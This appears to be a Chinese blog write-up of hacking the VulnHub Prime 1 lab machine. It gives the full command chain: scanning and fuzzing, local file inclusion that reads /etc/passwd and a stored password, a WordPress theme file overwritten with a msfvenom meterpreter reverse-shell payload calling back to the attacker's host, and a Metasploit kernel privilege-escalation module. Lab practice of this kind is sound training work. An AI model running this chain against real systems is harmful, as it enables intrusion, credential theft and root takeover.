vulnhub之prime1的实践

本周实践的是vulnhub的prime1镜像，下载地址，https://download.vulnhub.com/prime/Prime_Series_Level-1.rar，

这是个奇葩的靶机，一路下来全靠提示猜谜语，

镜像一起来就能看到用户名victor，那就找密码呗，

做个地址扫描，sudo netdiscover -r 192.168.137.0/24，

再做个端口扫描，sudo nmap -sS -sV -A -p- 192.168.137.119，

有web服务就目录爆破呗，sudo dirb http://192.168.137.119，

有个dev的url，访问一下看看，提示让再努力dig一下，

那就再努力dig一下吧，sudo dirb http://192.168.137.119 -X .txt,.php,.html,.zip，看到有一个叫secret.txt的文件，

访问一下，提示让做fuzz，并且提示了一个叫location.txt的文件，

按照提示访问https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web学做fuzz，

sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.137.119/index.php?FUZZ=something，

sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 12 http://192.168.137.119/index.php?FUZZ=something，

根据结果和之前的location.txt文件提示访问http://192.168.137.119/index.php?file=location.txt，又提示了一个secrettier360参数，

猜测是否有本地文件包含漏洞，还真能读到系统密码文件，

http://192.168.137.119/image.php?secrettier360=/etc/passwd，

又提示了去/home/saket/找password.txt，

那就继续吧，http://192.168.137.119/image.php?secrettier360=/home/saket/password.txt，嗯，密码找到了，是follow_the_ippsec，

尝试ssh登录失败，想到前面目录爆破的时候还有个url是wordpress，

用victor/follow_the_ippsec登录还真成功了，

找到可以被update内容的url，http://192.168.137.119/wordpress/wp-content/themes/twentynineteen/secret.php，

做一个web shell脚本，sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.137.2 LPORT=4444 R，

把内容贴进去并update成功，

用kali开一个监听，

use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.137.2
set lport 4444
exploit

并重新访问这个url，反弹shell就过来了，发现不是root权限，

想办法提权呗，先把会话放到后台，background，

发现系统版本是ubuntu 4.10.0-28-generic，

一搜还真有提权漏洞可用，search 4.10.0-28-generic，开始提权，

use exploit/linux/local/bpf_sign_extension_priv_esc，set session 1，

拿到一个新的反弹shell，这回是root了，

至此拿root权限成功。
